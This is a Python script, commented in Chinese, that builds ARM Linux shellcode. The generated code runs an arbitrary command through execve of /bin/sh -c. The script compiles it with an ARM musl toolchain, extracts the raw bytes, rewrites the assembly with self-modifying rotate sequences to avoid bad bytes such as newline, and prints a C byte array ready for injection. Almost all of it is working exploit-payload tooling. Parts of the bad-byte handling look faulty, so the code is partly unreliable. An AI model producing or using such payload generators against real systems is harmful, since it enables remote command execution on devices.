import sys
import os
import time
import tempfile

import subprocess
def format_c_char_array(var_name, string):
    output = []
    length = len(string) + 1  # include null terminator
    output.append(f"char {var_name}[{length}];")
    for i, c in enumerate(string):
        if c == "'":
            c_repr = "\\'"  # escape single quote
        elif c == '\\':
            c_repr = '\\\\'  # escape backslash
        elif c == '\n':
            c_repr = '\\n'
        elif c == '\t':
            c_repr = '\\t'
        else:
            c_repr = c
        output.append(f"{var_name}[{i}] = '{c_repr}';")
    output.append(f"{var_name}[{length - 1}] = '\\0';")
    return "\n".join(output)
import struct

def rotate_left_bytes(byte_data, shift_amount):
    """
    对4字节字节流进行循环左移（使用struct模块）
    
    参数:
    byte_data (bytes): 4字节字节流
    shift_amount (int): 左移位数
    
    返回:
    bytes: 循环左移后的4字节字节流
    """
    # 确保是4字节
    if len(byte_data) != 4:
        raise ValueError("输入必须是4字节")
    
    # 使用struct.unpack转换为无符号整数（大端序）
    value, = struct.unpack('<I', byte_data)
    print("pre:",hex(value))
    # 取模，避免多余移位
    shift_amount = shift_amount % 32
    
    # 循环左移操作
    rotated = ((value << shift_amount) | (value >> (32 - shift_amount))) & 0xFFFFFFFF
    print("after:",hex(rotated))
    # 使用struct.pack转回字节流
    return struct.pack('<I', rotated)

def get_shellcode(cmd,badbyte=""):

    shecode_c="""
    #include <sys/syscall.h>
    void _start() {"""+f"""
    {format_c_char_array("arg0", "/bin/sh")}
    {format_c_char_array("arg1", "-c")}
    {format_c_char_array("arg2", cmd)}
    """+"""
        char *args[] = {arg0, arg1, arg2, 0};
        __asm__ volatile (
            "mov r7, %0\\n\\t"        
            "mov r0, %1\\n\\t"        
            "mov r1, %2\\n\\t"        
            "mov r2, #0\\n\\t"       
            "svc #0\\n\\t" 
            :
            : "i"(11), "r"(arg0), "r"(args)
            : "r0", "r1", "r2", "r7"
        );

    }
    """
    # temp_name =  tempfile.mktemp()
    temp_name="./aa"
    with open(f"{temp_name}.c","w")as fd:
        fd.write(shecode_c)


    gccpath="."
    # gccpath="/root/musl_packet"
    # os.system(f"""{gccpath}/bin/arm-linux-musleabi-gcc -nostdlib -O0 -fno-pic -fno-builtin -o {temp_name} {temp_name}.c""")
    os.system(f"""{gccpath}/bin/arm-linux-musleabi-gcc -S -nostdlib -O0 -fno-pic -fno-builtin -o {temp_name}.s {temp_name}.c""")
    os.system(f"""{gccpath}/bin/arm-linux-musleabi-gcc  -T custom_linker.ld -nostdlib -O0 -fno-pic -z execstack -fno-builtin -o {temp_name} {temp_name}.s""")

    os.system(f"{gccpath}/bin/arm-linux-musleabi-objcopy -O binary {temp_name} {temp_name}.bin")
          

    with open(f"{temp_name}.bin","rb") as fd:
        output=fd.read()
    

    if badbyte in output: #为了简化代码，读取.s文件和字节对应，可能会出现问题，需要进一步测试
        badIndex=[]
        for i,item in enumerate(output):
            if item==ord(badbyte):
                badIndex.append(i//4)
        with open(f"{temp_name}.s",'r') as fd:
            content=fd.read()
        LineIndex=0
        result_asm=""
        result_asm+=content.split("@ link register save eliminated.")[0]+"@ link register save eliminated.\n\t"
        asm=content.split("@ link register save eliminated.\n\t")[1]
        asm=asm.split("\n")
        badAsmInfo=[]
        pre_badlineI=0
        for badlineI in badIndex:
            result_asm+="\n".join(asm[pre_badlineI:badlineI])
            pre_badlineI=badlineI
            # def generate_asm(line):
            padasm="""\nldr r10,[pc,#40]\nror r10, r10, #4  @循环右移 \nstr r10,[pc,#32]\nmov r10,#3\nstr r10,[sp,#-48]\nmov r10,#0\nstr r10,[sp,#-44]\nstr r10,[sp,#-40]\nadd r0,sp,#-48\nmov r1, #0 \nmov r7, #162\nsvc #0\n"""
            result_asm+= padasm
        result_asm+="\n".join(asm[pre_badlineI:])
        with open(f"{temp_name}.s",'w') as fd:
            fd.write(result_asm)


            badAsmInfo.append([badlineI,asm[badlineI],output[badlineI*4:badlineI*4+4]])
        os.system(f"""{gccpath}/bin/arm-linux-musleabi-gcc  -T custom_linker.ld -nostdlib -O0 -fno-pic -z execstack -fno-builtin -o {temp_name} {temp_name}.s""")
        os.system(f"{gccpath}/bin/arm-linux-musleabi-objcopy -O binary {temp_name} {temp_name}.bin")
        with open(f"{temp_name}.bin","rb") as fd:
            output=fd.read()
        for bi in badAsmInfo:
            bad_byteASM=bi[2]
            output=output.replace(bad_byteASM,rotate_left_bytes(bad_byteASM,4))
        return output
def bytes_to_c_array(bytes_data, array_name="code", line_length=12):
    """将Python的bytes对象转换为C语言的数组形式
    
    Args:
        bytes_data: 要转换的bytes对象
        array_name: C数组的名称，默认为"byte_array"
        line_length: 每行放置的字节数，默认为12
    
    Returns:
        表示C数组的字符串
    """
    c_array = [f"unsigned char {array_name}[] = {{"]
    bytes_per_line = []
    
    for i, byte in enumerate(bytes_data):
        # 每12个字节换行一次，提高可读性
        if i > 0 and i % line_length == 0:
            c_array.append("    " + ", ".join(bytes_per_line) + ",")
            bytes_per_line = []
        
        bytes_per_line.append(f"0x{byte:02X}")
    
    # 添加最后一行
    if bytes_per_line:
        c_array.append("    " + ", ".join(bytes_per_line))
    
    c_array.append("};")
    c_array.append(f"size_t {array_name}_len = {len(bytes_data)};")
    
    return "\n".join(c_array)

    #     result=b""
    # if len(sys.argv)==3 and sys.argv[1]=="--test":
    #     print(f"generate File {temp_name} {temp_name}.bin {temp_name}.c")
    # else:
    #     os.system(f"rm {temp_name} {temp_name}.bin {temp_name}.c")
    # returncode, output = subprocess.getstatusoutput(r"""xxd -p ./shellcode.bin | tr -d '\n' | sed 's/\(..\)/\\x\1/g' | sed 's/^/b"/;s/$/"/'""")
  
if __name__=="__main__":
    out=get_shellcode(sys.argv[1],badbyte=b"\x0a")
    print(bytes_to_c_array(out))
